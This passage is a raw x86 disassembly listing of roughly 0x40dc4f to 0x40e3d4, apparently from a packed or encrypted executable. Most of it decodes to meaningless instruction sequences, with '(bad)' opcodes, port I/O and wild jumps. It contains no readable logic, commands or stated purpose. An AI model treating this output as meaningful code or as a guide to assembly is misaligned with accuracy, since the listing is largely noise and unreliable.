  40dc4f:	and    DWORD PTR ds:0x4326f8,0x434411
  40dc59:	xor    ecx,eax
  40dc5b:	jmp    0x40e04f
  40dc60:	mov    bl,0x93
  40dc62:	iret   
  40dc63:	(bad)
  40dc66:	mov    cl,0x71
  40dc68:	out    0x43,eax
  40dc6a:	fs jb  0x40dc65
  40dc6d:	mov    ch,0x67
  40dc6f:	xor    DWORD PTR [eax+0x49707096],esp
  40dc75:	jge    0x40dce7
  40dc77:	jo     0x40dc51
  40dc79:	ins    BYTE PTR es:[edi],dx
  40dc7a:	or     cl,ch
  40dc7c:	pusha  
  40dc7d:	shr    DWORD PTR [ebp-0x2780e786],0xd2
  40dc84:	ror    DWORD PTR [esi-0xcdc1884],cl
  40dc8a:	inc    ebx
  40dc8b:	daa    
  40dc8c:	xchg   ebx,eax
  40dc8d:	(bad)  
  40dc8e:	jno    0x40dcc6
  40dc90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc91:	mov    esp,0x4dc85883
  40dc96:	dec    ebp
  40dc97:	stc    
  40dc98:	outs   dx,BYTE PTR ds:[esi]
  40dc99:	in     eax,0xbb
  40dc9b:	mov    ebx,0x10bed852
  40dca0:	xchg   BYTE PTR [ebx+0x21],bl
  40dca3:	nop
  40dca4:	or     DWORD PTR ds:0x11f42f,eax
  40dcaa:	or     eax,0x56311367
  40dcaf:	pop    eax
  40dcb0:	jle    0x40dc72
  40dcb2:	out    dx,eax
  40dcb3:	add    al,ch
  40dcb5:	scas   eax,DWORD PTR es:[edi]
  40dcb6:	add    al,0x1a
  40dcb8:	cmp    al,dl
  40dcba:	mov    ch,0x20
  40dcbc:	imul   ebx,DWORD PTR [edx+0x32614959],0xfffffffe
  40dcc3:	pop    edx
  40dcc4:	mov    ecx,0x45b22ccf
  40dcc9:	pusha  
  40dcca:	mov    al,0xee
  40dccc:	cmp    al,0x65
  40dcce:	fisttp WORD PTR [esi]
  40dcd0:	pop    ecx
  40dcd1:	xchg   DWORD PTR [edx+0x40],esi
  40dcd4:	add    BYTE PTR [ebx+0x139063b5],0xac
  40dcdb:	cmp    al,0x36
  40dcdd:	dec    ecx
  40dcde:	rcr    bh,0x42
  40dce1:	arpl   cx,ax
  40dce3:	jno    0x40dce9
  40dce5:	sar    DWORD PTR [ecx+0x5b],0x7d
  40dce9:	aad    0x33
  40dceb:	pop    ebx
  40dcec:	jle    0x40dce0
  40dcee:	xor    al,cl
  40dcf0:	xor    al,0xfb
  40dcf2:	add    BYTE PTR [eax+0x6e],ah
  40dcf5:	xchg   ebx,eax
  40dcf6:	out    dx,al
  40dcf7:	aas    
  40dcf8:	mov    ds:0x12e22107,eax
  40dcfd:	mov    WORD PTR [edx-0x64],ds
  40dd00:	pop    eax
  40dd01:	jnp    0x40dcdc
  40dd03:	mov    bl,BYTE PTR [edx+eax*4-0x44]
  40dd07:	or     dh,dh
  40dd09:	stos   BYTE PTR es:[edi],al
  40dd0a:	jae    0x40dcdf
  40dd0c:	call   0x2e25:0xce7bf20f
  40dd13:	dec    ebp
  40dd14:	ja     0x40dcf7
  40dd16:	fst    QWORD PTR [eax-0x43]
  40dd19:	sbb    ch,bl
  40dd1b:	dec    ebx
  40dd1c:	jb     0x40dd4b
  40dd1e:	or     DWORD PTR ds:0x52fd19df,ebx
  40dd24:	dec    edx
  40dd25:	jns    0x40dccc
  40dd27:	(bad)  
  40dd28:	iret   
  40dd29:	call   ebp
  40dd2b:	frstpm(287 only) 
  40dd2d:	sub    bl,BYTE PTR [edx-0x66]
  40dd30:	je     0x40ddad
  40dd32:	cmp    eax,0x1074863a
  40dd37:	and    al,0x36
  40dd39:	sbb    DWORD PTR [eax],0x7d653c0c
  40dd3f:	xchg   ecx,eax
  40dd40:	dec    esi
  40dd41:	xchg   edx,eax
  40dd42:	test   bl,0xa7
  40dd45:	adc    esi,DWORD PTR [esi+ebx*8]
  40dd48:	mov    cl,0xa0
  40dd4a:	xor    BYTE PTR [edi],ah
  40dd4c:	or     eax,0x5640497e
  40dd51:	out    0xe1,eax
  40dd53:	jmp    0x1f21b8f1
  40dd58:	push   edi
  40dd59:	pop    eax
  40dd5a:	repnz in eax,dx
  40dd5c:	cmp    eax,0x379bca20
  40dd61:	adc    eax,0x833a322e
  40dd66:	mov    cl,0x53
  40dd68:	int    0x92
  40dd6a:	in     eax,0xe7
  40dd6c:	lock icebp 
  40dd6e:	popa   
  40dd6f:	cmp    al,0x48
  40dd71:	ffreep st(0)
  40dd73:	add    edi,ebx
  40dd75:	ss mov dh,0xcb
  40dd78:	lock pop edi
  40dd7a:	push   edi
  40dd7b:	ins    BYTE PTR es:[edi],dx
  40dd7c:	mov    es:0x7dac9ca1,eax
  40dd82:	or     DWORD PTR [ebx+0x174ce707],0x3394252c
  40dd8c:	mov    eax,ds:0x5697538b
  40dd91:	rcr    DWORD PTR [esi],1
  40dd93:	js     0x40dd4d
  40dd95:	adc    eax,0x4fc263fb
  40dd9a:	stos   BYTE PTR es:[edi],al
  40dd9b:	mov    esp,0xb63a4f0
  40dda0:	pop    ecx
  40dda1:	dec    ebx
  40dda2:	sub    ebx,DWORD PTR [esi-0xa]
  40dda5:	popa   
  40dda6:	stos   BYTE PTR es:[edi],al
  40dda7:	cmp    bl,BYTE PTR [eax+edx*8+0x2e]
  40ddab:	add    esp,DWORD PTR [ebx]
  40ddad:	pop    DWORD PTR [edi]
  40ddaf:	push   es
  40ddb0:	push   es
  40ddb1:	in     eax,dx
  40ddb2:	push   ds
  40ddb3:	mov    ebx,0x6dbc2936
  40ddb8:	inc    edi
  40ddb9:	call   FWORD PTR [edi-0x5a9be6d6]
  40ddbf:	loopne 0x40dd50
  40ddc1:	das    
  40ddc2:	inc    esp
  40ddc3:	jmp    0xa937d575
  40ddc8:	jle    0x40dd67
  40ddca:	xlat   BYTE PTR ds:[ebx]
  40ddcb:	xor    eax,DWORD PTR [ebp-0x183326cb]
  40ddd1:	mov    cl,0x14
  40ddd3:	push   edx
  40ddd4:	jno    0x40dd8a
  40ddd6:	test   BYTE PTR [ebp-0x429306dd],ah
  40dddc:	cmp    eax,0x4195e0f1
  40dde1:	mov    ebx,0x9da79e28
  40dde6:	pop    esp
  40dde7:	inc    esp
  40dde8:	hlt    
  40dde9:	sar    ah,cl
  40ddeb:	push   esp
  40ddec:	in     eax,dx
  40dded:	cdq    
  40ddee:	or     ebp,edx
  40ddf0:	pop    ebp
  40ddf1:	adc    cl,dl
  40ddf3:	dec    esi
  40ddf4:	jge    0x40ddbf
  40ddf6:	sbb    BYTE PTR gs:[ebx],bl
  40ddf9:	popa   
  40ddfa:	xchg   edx,eax
  40ddfb:	mov    esp,0x65ce7f3e
  40de00:	inc    edx
  40de01:	inc    ecx
  40de02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de03:	cli    
  40de04:	(bad)  
  40de05:	jb     0x40ddb5
  40de07:	sub    al,0xaa
  40de09:	out    dx,eax
  40de0a:	xor    ecx,edx
  40de0c:	pusha  
  40de0d:	out    dx,eax
  40de0e:	xchg   ebp,eax
  40de0f:	(bad)  
  40de10:	mov    WORD PTR [ebp+0x305a006e],?
  40de16:	mov    eax,ds:0x66eaa903
  40de1b:	xchg   edx,edx
  40de1d:	daa    
  40de1e:	cmp    bl,BYTE PTR [esp+ebp*2+0x5e]
  40de22:	and    bh,BYTE PTR [ecx+0x7269966b]
  40de28:	mov    bh,0x6e
  40de2a:	jo     0x40ddfd
  40de2c:	sub    al,0x95
  40de2e:	stos   BYTE PTR es:[edi],al
  40de2f:	sbb    eax,0x67575f23
  40de34:	cwde   
  40de35:	frstor [esi]
  40de37:	pusha  
  40de38:	repnz pusha 
  40de3a:	xchg   ebp,eax
  40de3b:	or     al,0xb9
  40de3d:	jle    0x40de95
  40de3f:	adc    al,BYTE PTR [edx+eiz*4+0x61eac138]
  40de46:	inc    eax
  40de47:	adc    eax,0xff1c27f7
  40de4c:	mov    dh,0xd8
  40de4e:	(bad)  
  40de4f:	mov    edi,0x458dd510
  40de54:	imul   ebx,eax,0xffffffb0
  40de57:	pop    ebx
  40de58:	pusha  
  40de59:	mov    ch,0x9f
  40de5b:	adc    DWORD PTR [edx+0x14],ebx
  40de5e:	int    0x58
  40de60:	(bad)  
  40de61:	daa    
  40de62:	aaa    
  40de63:	int    0x39
  40de65:	dec    edx
  40de66:	cs sub eax,0x7052b7e3
  40de6c:	sti    
  40de6d:	cli    
  40de6e:	and    al,0x77
  40de70:	mov    cl,0x47
  40de72:	arpl   WORD PTR [eax],ax
  40de74:	add    eax,ecx
  40de76:	push   ebp
  40de77:	imul   esi,esp,0x6509243e
  40de7d:	mov    esp,0x2038b650
  40de82:	repz push ds
  40de84:	dec    ecx
  40de85:	adc    BYTE PTR [edi+0x3b],0x95
  40de89:	dec    esp
  40de8a:	add    BYTE PTR [ecx*1+0x18d0b833],bh
  40de91:	add    dl,BYTE PTR [ebx-0x54]
  40de94:	clc    
  40de95:	jae    0x40de63
  40de97:	lock outs dx,DWORD PTR ds:[esi]
  40de99:	test   al,0xa2
  40de9b:	rol    DWORD PTR [esi],cl
  40de9d:	push   ecx
  40de9e:	cli    
  40de9f:	mov    dh,0xfa
  40dea1:	cld    
  40dea2:	cmp    eax,0xf89faabd
  40dea7:	and    ebp,DWORD PTR [esi+0x1be21489]
  40dead:	add    edx,edx
  40deaf:	xor    edi,DWORD PTR [edx]
  40deb1:	mov    dl,BYTE PTR [eax+ebx*8-0x539a94a7]
  40deb8:	add    DWORD PTR [eax+0x3],edi
  40debb:	push   ecx
  40debc:	lea    ebp,[esi-0x1f]
  40debf:	(bad)  
  40dec0:	mov    DWORD PTR [esi],ebx
  40dec2:	pop    eax
  40dec3:	dec    esp
  40dec4:	mov    ah,0xea
  40dec6:	push   cs
  40dec7:	push   ss
  40dec8:	sti    
  40dec9:	sbb    ah,BYTE PTR [ecx+0x29]
  40decc:	xor    DWORD PTR [ebx+0x6c2616ea],ebp
  40ded2:	sub    ah,BYTE PTR [edi-0x3e]
  40ded5:	or     eax,0x619ec813
  40deda:	mov    bh,0x44
  40dedc:	push   ds
  40dedd:	popa   
  40dede:	or     eax,0xbad58834
  40dee3:	test   esp,ebx
  40dee5:	popf   
  40dee6:	out    dx,al
  40dee7:	shl    DWORD PTR [edx-0x7a],cl
  40deea:	jb     0x40df66
  40deec:	cmp    BYTE PTR [ebx+0x11],cl
  40deef:	(bad)  
  40def1:	imul   ebx,DWORD PTR [ebp-0x63ed112b],0x725457cc
  40defb:	les    edi,FWORD PTR [ebx+0x6a]
  40defe:	inc    edi
  40deff:	vandnps ymm2,ymm7,YMMWORD PTR [esp+edi*2+0x2e]
  40df05:	mov    eax,0x764ed204
  40df0a:	sbb    edi,esi
  40df0c:	sbb    al,0x67
  40df0e:	mov    esp,0x9602f019
  40df13:	ins    BYTE PTR es:[edi],dx
  40df14:	push   ebp
  40df15:	inc    ebx
  40df16:	mov    esp,0x6388a5f
  40df1b:	bound  edi,QWORD PTR [edx+0x1847fee8]
  40df21:	mov    esp,0x4d547ec5
  40df26:	xchg   esi,eax
  40df27:	loop   0x40df84
  40df29:	xchg   ebx,eax
  40df2a:	addr16 sbb eax,0xb64f0752
  40df30:	xchg   ecx,eax
  40df31:	pop    ds
  40df32:	data16 rol BYTE PTR [edx+eiz*2-0x3759a233],cl
  40df3a:	bound  esi,QWORD PTR [eax+eiz*1-0x64]
  40df3e:	fs dec eax
  40df40:	(bad)  
  40df41:	out    dx,al
  40df42:	add    bh,0x79
  40df45:	test   BYTE PTR [ebx],dl
  40df47:	fs mov esp,0x10fdead3
  40df4d:	in     eax,0x16
  40df4f:	pushf  
  40df50:	mov    bh,0xa1
  40df52:	out    0xb9,al
  40df54:	or     DWORD PTR [esi],edx
  40df56:	repz jl 0x40def6
  40df59:	push   edi
  40df5a:	push   eax
  40df5b:	inc    esi
  40df5c:	push   edx
  40df5d:	iret   
  40df5e:	and    eax,0x7fb03c29
  40df63:	xchg   BYTE PTR [eax],bh
  40df65:	jae    0x40df0d
  40df67:	mov    al,0x1f
  40df69:	fyl2xp1 
  40df6b:	ins    BYTE PTR es:[edi],dx
  40df6c:	push   cs
  40df6d:	sub    ch,dh
  40df6f:	cmp    eax,0xfe5ceac6
  40df74:	pop    esi
  40df75:	fnstenv [ebp-0x6a]
  40df78:	inc    eax
  40df79:	cmp    BYTE PTR ds:0xa51c3405,al
  40df7f:	dec    BYTE PTR [ebx-0x24]
  40df82:	fwait
  40df83:	jecxz  0x40df37
  40df85:	ins    BYTE PTR es:[edi],dx
  40df86:	sar    DWORD PTR [ecx],cl
  40df88:	icebp  
  40df89:	pop    eax
  40df8a:	mov    ah,0xd9
  40df8c:	jae    0x40df48
  40df8e:	inc    edi
  40df8f:	popf   
  40df90:	call   0xfc4259e4
  40df95:	loopne 0x40dfb8
  40df97:	adc    eax,0x31ec88c5
  40df9c:	shl    bl,1
  40df9e:	or     dl,cl
  40dfa0:	pop    ss
  40dfa1:	push   ebp
  40dfa2:	and    al,0x52
  40dfa4:	push   cs
  40dfa5:	sbb    cl,BYTE PTR [esi+0x472f6830]
  40dfab:	dec    eax
  40dfac:	mov    dh,0xd9
  40dfae:	clc    
  40dfaf:	inc    edi
  40dfb0:	das    
  40dfb1:	pushf  
  40dfb2:	(bad)  
  40dfb4:	stos   BYTE PTR es:[edi],al
  40dfb5:	jge    0x40dfac
  40dfb7:	jg     0x40dfdd
  40dfb9:	sbb    BYTE PTR [edi+0x432ae599],0x1f
  40dfc0:	lahf   
  40dfc1:	dec    ebp
  40dfc2:	or     al,0x92
  40dfc4:	aad    0xba
  40dfc6:	inc    edx
  40dfc7:	xor    BYTE PTR [ebx+0x3eca134c],ah
  40dfcd:	fmul   QWORD PTR [edi+0x7a]
  40dfd0:	fwait
  40dfd1:	scas   al,BYTE PTR es:[edi]
  40dfd2:	dec    esi
  40dfd3:	sub    esi,0x4057c272
  40dfd9:	imul   edx,DWORD PTR [esi+ecx*8+0xc],0x124e6a12
  40dfe1:	inc    ebx
  40dfe2:	mov    eax,ds:0xa829f30f
  40dfe7:	mov    ebp,0x7fe6b04d
  40dfec:	mov    edx,0x776d4feb
  40dff1:	mov    eax,ds:0x9f5e631e
  40dff6:	xor    ebp,DWORD PTR [ebx+0x5e0b5e80]
  40dffc:	jp     0x40dfa3
  40dffe:	cld    
  40dfff:	lea    esp,[ebx]
  40e001:	iret   
  40e002:	xchg   ebx,eax
  40e003:	sub    edx,DWORD PTR [ebx+edi*4-0x7d316599]
  40e00a:	dec    ecx
  40e00b:	fimul  DWORD PTR [ecx-0xf]
  40e00e:	cmp    edi,DWORD PTR [edi]
  40e010:	into   
  40e011:	adc    DWORD PTR [esi+0x56],ebx
  40e014:	jbe    0x40e07c
  40e016:	cmp    al,0xa3
  40e018:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e019:	data16 in al,dx
  40e01b:	push   ebx
  40e01c:	fimul  WORD PTR ds:[ecx+0x5c]
  40e020:	add    al,BYTE PTR [ecx+0x59b274d8]
  40e026:	lahf   
  40e027:	dec    esp
  40e028:	fbld   TBYTE PTR [edi+eiz*2]
  40e02b:	dec    esp
  40e02c:	clc    
  40e02d:	mov    WORD PTR [eax+ebp*2],es
  40e030:	shl    BYTE PTR [bx+di+0x485c],0xb8
  40e036:	aad    0xa3
  40e038:	jnp    0x40e052
  40e03a:	je     0x40e068
  40e03c:	shl    DWORD PTR [edx+0xf],1
  40e03f:	pop    ebp
  40e040:	push   esi
  40e041:	push   eax
  40e042:	inc    esp
  40e043:	hlt    
  40e044:	scas   eax,DWORD PTR es:[edi]
  40e045:	fistp  QWORD PTR [ecx-0x22]
  40e048:	sahf   
  40e049:	jge    0x40e079
  40e04b:	test   DWORD PTR [ebx],ebp
  40e04d:	mov    ebp,ss
  40e04f:	xor    edi,edi
  40e051:	add    ecx,ebx
  40e053:	mov    DWORD PTR [ebp-0x20],ecx
  40e056:	mov    eax,ds:0x434396
  40e05b:	mov    eax,DWORD PTR [ebp-0x20]
  40e05e:	jmp    0x40e452
  40e063:	xlat   BYTE PTR ds:[ebx]
  40e064:	frstor [esi-0xeac49ad]
  40e06a:	pop    ecx
  40e06b:	test   DWORD PTR [ecx],0xb3e2baa7
  40e071:	add    BYTE PTR ds:0x707092f9,0x49
  40e078:	jge    0x40e0ea
  40e07a:	jo     0x40e020
  40e07c:	or     eax,0x379155e
  40e081:	retf   
  40e082:	inc    eax
  40e083:	sub    al,0x78
  40e085:	arpl   WORD PTR [ebx-0x6f28aff9],ax
  40e08b:	mov    eax,esi
  40e08d:	inc    edx
  40e08e:	pop    esi
  40e08f:	xor    dl,bh
  40e091:	sbb    al,0x55
  40e093:	and    eax,0x95958279
  40e098:	enter  0x3fa4,0x8d
  40e09c:	mov    edx,0xbf7ce1b4
  40e0a1:	push   eax
  40e0a2:	push   0x7d07543f
  40e0a7:	pop    es
  40e0a8:	dec    edi
  40e0a9:	xlat   BYTE PTR ds:[ebx]
  40e0aa:	jae    0x40e04c
  40e0ac:	mov    al,ds:0x1f0c1a4c
  40e0b1:	add    al,BYTE PTR [ebx+0x37]
  40e0b4:	clc    
  40e0b5:	adc    ebx,DWORD PTR [esi+0x57]
  40e0b8:	hlt    
  40e0b9:	fisttp WORD PTR [esi]
  40e0bb:	jnp    0x40e0ee
  40e0bd:	xlat   BYTE PTR ds:[ebx]
  40e0be:	mov    ds:0x3aa47f4f,al
  40e0c3:	retf   
  40e0c4:	push   esi
  40e0c5:	adc    ecx,ebx
  40e0c7:	(bad)  
  40e0c8:	test   BYTE PTR ds:0x19b18912,0xf6
  40e0cf:	xchg   ebx,eax
  40e0d0:	mov    edx,0x5625b7e1
  40e0d5:	ret    
  40e0d6:	outs   dx,DWORD PTR ds:[esi]
  40e0d7:	inc    eax
  40e0d8:	xor    esi,DWORD PTR ss:[edi-0x67]
  40e0dc:	jo     0x40e105
  40e0de:	xor    dl,dl
  40e0e0:	test   BYTE PTR [esi-0x3e960029],0x11
  40e0e7:	pushf  
  40e0e8:	aam    0x54
  40e0ea:	sahf   
  40e0eb:	(bad)  
  40e0ec:	fist   DWORD PTR [eax+0x3364f17c]
  40e0f2:	mov    ?,WORD PTR [edx+0x1db1251d]
  40e0f8:	enter  0x2fce,0x19
  40e0fc:	cdq    
  40e0fd:	out    0x61,al
  40e0ff:	push   0x47
  40e101:	fimul  DWORD PTR [ebx-0x51]
  40e104:	mov    esp,0x7558e863
  40e109:	inc    ebp
  40e10a:	lock dec esp
  40e10c:	ins    DWORD PTR es:[edi],dx
  40e10d:	adc    edi,DWORD PTR [eax+0x1060502d]
  40e113:	and    eax,0x1bcb7df3
  40e118:	ja     0x40e111
  40e11a:	addr16 inc edi
  40e11c:	adc    al,0x16
  40e11e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e11f:	(bad)  
  40e120:	stos   DWORD PTR es:[edi],eax
  40e121:	adc    edi,ebp
  40e123:	enter  0x1cb,0xf3
  40e127:	(bad)  
  40e128:	fdivr  QWORD PTR [esp+edi*1-0x49]
  40e12c:	or     BYTE PTR [eax-0x4c],cl
  40e12f:	aas    
  40e130:	jge    0x40e0b9
  40e132:	or     al,0x5b
  40e134:	daa    
  40e135:	adc    cl,BYTE PTR ds:0x97424768
  40e13b:	hlt    
  40e13c:	leave  
  40e13d:	les    dx,DWORD PTR [ecx-0x37]
  40e141:	push   ecx
  40e142:	bound  eax,QWORD PTR [ebx+edi*1-0x19]
  40e146:	pop    esi
  40e147:	mov    eax,ds:0xb03610d1
  40e14c:	outs   dx,BYTE PTR ds:[esi]
  40e14d:	out    0xda,al
  40e14f:	mov    bl,0xc3
  40e151:	pushf  
  40e152:	mov    ch,0xc3
  40e154:	cmp    bh,dh
  40e156:	push   ss
  40e157:	xchg   ebx,eax
  40e158:	ss push es
  40e15a:	outs   dx,BYTE PTR ds:[esi]
  40e15b:	stos   DWORD PTR es:[edi],eax
  40e15c:	sbb    cl,ch
  40e15e:	sahf   
  40e15f:	add    BYTE PTR ds:0x53d59b44,0xb1
  40e166:	sbb    ah,BYTE PTR [edx-0x48]
  40e169:	xor    al,0x7c
  40e16b:	clc    
  40e16c:	fsubr  st(2),st
  40e16e:	int3   
  40e16f:	imul   edx,DWORD PTR [ebx],0xffffffd8
  40e172:	jns    0x40e155
  40e174:	imul   ebp,ebp,0x81e823a4
  40e17a:	ret    0x7f1a
  40e17d:	jecxz  0x40e115
  40e17f:	int3   
  40e180:	fcomip st,st(1)
  40e182:	add    bl,BYTE PTR [esi+0x76aa312]
  40e188:	(bad)  
  40e189:	jecxz  0x40e111
  40e18b:	mov    ah,0xa3
  40e18d:	jae    0x40e18b
  40e18f:	add    esi,ebp
  40e191:	mov    ds:0x3cb5bc09,eax
  40e196:	popa   
  40e197:	dec    esp
  40e198:	mov    ebp,DWORD PTR [ebx]
  40e19a:	xchg   ebx,eax
  40e19b:	retf   0xccaf
  40e19e:	xchg   edi,eax
  40e19f:	adc    ah,ch
  40e1a1:	push   esi
  40e1a2:	add    al,0xa8
  40e1a4:	bound  ebp,QWORD PTR [ebp-0x199c0c3]
  40e1aa:	inc    ebx
  40e1ab:	mov    BYTE PTR [edi],ch
  40e1ad:	lock jle 0x40e1af
  40e1b0:	fcomp  DWORD PTR [esi-0x54b8471e]
  40e1b6:	aaa    
  40e1b7:	or     al,0xc8
  40e1b9:	mov    ch,0xf3
  40e1bb:	mov    ebp,0xf1804749
  40e1c0:	and    ecx,esi
  40e1c2:	add    BYTE PTR [ebp+0x3],bl
  40e1c5:	mov    dh,0x19
  40e1c7:	push   0x1
  40e1c9:	fcom   DWORD PTR [esi]
  40e1cb:	jbe    0x40e18c
  40e1cd:	jg     0x40e213
  40e1cf:	fcom   st(4)
  40e1d1:	(bad)  
  40e1d2:	test   eax,0x28a39a8d
  40e1d7:	xlat   BYTE PTR ds:[ebx]
  40e1d8:	fidiv  WORD PTR [esi]
  40e1da:	ins    BYTE PTR es:[edi],dx
  40e1db:	fwait
  40e1dc:	scas   eax,DWORD PTR es:[edi]
  40e1dd:	aam    0xb3
  40e1df:	mov    dh,0xed
  40e1e1:	rcr    edx,1
  40e1e3:	xchg   dl,ah
  40e1e5:	pop    ds
  40e1e6:	add    BYTE PTR [ebp-0x32],ch
  40e1e9:	pop    edi
  40e1ea:	add    edi,esp
  40e1ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1ed:	or     esi,edi
  40e1ef:	stos   DWORD PTR es:[edi],eax
  40e1f0:	loopne 0x40e1a6
  40e1f2:	xlat   BYTE PTR ds:[ebx]
  40e1f3:	mov    bl,0x37
  40e1f5:	add    ebp,DWORD PTR [edx]
  40e1f7:	in     al,dx
  40e1f8:	xchg   edx,eax
  40e1f9:	pop    esi
  40e1fa:	xor    bl,0x7c
  40e1fd:	xor    ebx,ecx
  40e1ff:	daa    
  40e200:	adc    eax,0x4689f0a9
  40e205:	fwait
  40e206:	sub    DWORD PTR [ecx-0x1dca4365],0xffffffe3
  40e20d:	cmp    eax,0x448d268
  40e212:	adc    DWORD PTR [ecx-0x5d38afe1],edx
  40e218:	jle    0xba822212
  40e21e:	jne    0x40e24b
  40e220:	cmp    dh,BYTE PTR [eax+0x2f]
  40e223:	push   ecx
  40e224:	mov    ds:0x8787c6c0,eax
  40e229:	rcl    bl,0xc1
  40e22c:	cwde   
  40e22d:	pop    ebp
  40e22e:	gs test al,0x1e
  40e231:	and    ch,BYTE PTR [ebx]
  40e233:	xchg   edi,eax
  40e234:	mov    edi,0xbb2f937c
  40e239:	jecxz  0x40e204
  40e23b:	add    bh,ch
  40e23d:	add    dl,BYTE PTR [edi+0x2c0f1ad0]
  40e243:	pop    ebx
  40e244:	jbe    0x40e2b2
  40e246:	cwde   
  40e247:	push   0xfffffff5
  40e249:	mov    eax,0xd701c39f
  40e24e:	fld    TBYTE PTR [edi+edi*2-0x49]
  40e252:	mov    al,0x5
  40e254:	jl     0x40e294
  40e256:	cwde   
  40e257:	push   edx
  40e258:	cmp    DWORD PTR [ecx],eax
  40e25a:	lock (bad) 
  40e25c:	fdivr  DWORD PTR ds:0xb0f3486f
  40e262:	adc    BYTE PTR [edx],dh
  40e264:	cld    
  40e265:	and    BYTE PTR [ecx+0x2f9ce14b],cl
  40e26b:	push   esi
  40e26c:	mov    dl,0xe0
  40e26e:	lahf   
  40e26f:	(bad)  
  40e270:	lds    ebp,FWORD PTR [esi-0xa9bd653]
  40e276:	mov    eax,ds:0x2dcc2d1b
  40e27b:	dec    edx
  40e27c:	add    al,0xc
  40e27e:	xor    ebp,DWORD PTR [esi]
  40e280:	test   eax,0x8b9cbd8f
  40e285:	pop    esp
  40e286:	clc    
  40e287:	xchg   ebx,eax
  40e288:	mul    BYTE PTR [edx]
  40e28a:	jmp    0x26ec35ea
  40e28f:	lock jne 0x40e2ea
  40e292:	out    dx,al
  40e293:	nop
  40e294:	inc    ecx
  40e295:	dec    edi
  40e296:	dec    eax
  40e297:	test   BYTE PTR [edx+edx*2-0x26c892e8],ah
  40e29e:	sbb    DWORD PTR [ebx],ecx
  40e2a0:	es mov di,0xb8e0
  40e2a5:	and    BYTE PTR [ecx+eiz*1],cl
  40e2a8:	push   ecx
  40e2a9:	pop    esi
  40e2aa:	cmc    
  40e2ab:	aad    0xab
  40e2ad:	pop    edi
  40e2ae:	stc    
  40e2af:	(bad)  
  40e2b0:	out    dx,eax
  40e2b1:	push   0xffffffdf
  40e2b3:	mov    dl,0x6c
  40e2b5:	mov    bh,0x7
  40e2b7:	jo     0x40e292
  40e2b9:	adc    BYTE PTR [edx-0x45],ah
  40e2bc:	add    edx,DWORD PTR [edx-0x1]
  40e2bf:	nop
  40e2c0:	jg     0x40e2ad
  40e2c2:	stc    
  40e2c3:	loope  0x40e302
  40e2c5:	jle    0x40e260
  40e2c7:	push   es
  40e2c8:	xchg   BYTE PTR [edi-0x62],dh
  40e2cb:	adc    al,0x70
  40e2cd:	mov    eax,0x6e6c6937
  40e2d2:	dec    eax
  40e2d3:	and    BYTE PTR [edi],bh
  40e2d5:	pop    ebp
  40e2d6:	call   0x240d7f32
  40e2db:	and    eax,0x4879bd60
  40e2e0:	jecxz  0x40e361
  40e2e2:	push   ss
  40e2e3:	popf   
  40e2e4:	cld    
  40e2e5:	dec    ebp
  40e2e6:	ds dec edx
  40e2e8:	(bad)  
  40e2e9:	jp     0x40e2e5
  40e2eb:	mov    WORD PTR [ebx+ebp*2+0x10002430],?
  40e2f2:	lods   eax,DWORD PTR ds:[esi]
  40e2f3:	push   ss
  40e2f4:	in     eax,dx
  40e2f5:	mov    BYTE PTR [ebx],bl
  40e2f7:	mov    al,BYTE PTR [edx]
  40e2f9:	and    al,0xe0
  40e2fb:	into   
  40e2fc:	imul   esp,DWORD PTR [edx-0x4a],0x801bb6c6
  40e303:	fwait
  40e304:	ret    0x8d71
  40e307:	mov    ds:0xacceabaa,eax
  40e30c:	aam    0xc1
  40e30e:	mov    ecx,0x6a4f6ea3
  40e313:	cmc    
  40e314:	loopne 0x40e33d
  40e316:	cmp    eax,0xd7769f92
  40e31b:	jae    0x40e366
  40e31d:	push   eax
  40e31e:	inc    esi
  40e31f:	aas    
  40e320:	mov    ebp,0xba2b7434
  40e325:	mov    ds:0x47d21469,eax
  40e32a:	(bad)  
  40e32c:	popa   
  40e32d:	lahf   
  40e32e:	pop    esp
  40e32f:	sar    dl,cl
  40e331:	mov    ds:0x4fa22385,al
  40e336:	fs dec esp
  40e338:	scas   eax,DWORD PTR es:[edi]
  40e339:	jmp    0xc877:0xa7ab4310
  40e340:	retf   
  40e341:	jne    0x40e396
  40e343:	lods   eax,DWORD PTR ds:[esi]
  40e344:	ja     0x40e381
  40e346:	or     BYTE PTR [ecx],bh
  40e348:	push   esi
  40e349:	jnp    0x40e39d
  40e34b:	cli    
  40e34c:	mov    bl,0x73
  40e34e:	jle    0x40e3bf
  40e350:	ret    
  40e351:	mov    esp,0x65c2fc72
  40e356:	cmp    eax,0x648fdd54
  40e35b:	call   0x6def:0x1113c8d3
  40e362:	xor    al,0x2b
  40e364:	or     DWORD PTR [ecx],0xf14f0ddb
  40e36a:	pop    ss
  40e36b:	add    ebp,edi
  40e36d:	mov    bl,0x4
  40e36f:	mov    cs,esi
  40e371:	fincstp 
  40e373:	dec    edx
  40e374:	aam    0x23
  40e376:	sbb    edx,DWORD PTR [edi+0x49cbe118]
  40e37c:	fld    DWORD PTR [esi+0x77]
  40e37f:	loop   0x40e400
  40e381:	mov    esi,DWORD PTR [eax]
  40e383:	les    ecx,FWORD PTR [ecx]
  40e385:	mov    ds:0x80e37117,eax
  40e38a:	int    0xb9
  40e38c:	cld    
  40e38d:	inc    ebx
  40e38e:	mov    ah,0x72
  40e390:	add    BYTE PTR [ebx-0x3d],bh
  40e393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e394:	ror    esi,1
  40e396:	adc    bh,BYTE PTR [edx+ebp*4+0x7a6074c2]
  40e39d:	test   bh,al
  40e39f:	add    BYTE PTR [ebx-0xb],bl
  40e3a2:	(bad)  
  40e3a4:	mov    bl,0x11
  40e3a6:	xchg   DWORD PTR [edx+0x3e0b35c6],ecx
  40e3ac:	call   0x9251ed86
  40e3b1:	add    bl,BYTE PTR [ebx+0x2ef56896]
  40e3b7:	mov    dh,dh
  40e3b9:	retf   0x3145
  40e3bc:	push   ds
  40e3bd:	loopne 0x40e387
  40e3bf:	xor    BYTE PTR [esi-0x36],bl
  40e3c2:	pusha  
  40e3c3:	add    esp,0x4762b16
  40e3c9:	adc    al,0xbe
  40e3cb:	adc    ebp,DWORD PTR [ebx+eax*4+0x20c06548]
  40e3d2:	int3   
  40e3d3:	dec    eax
  40e3d4:	das    
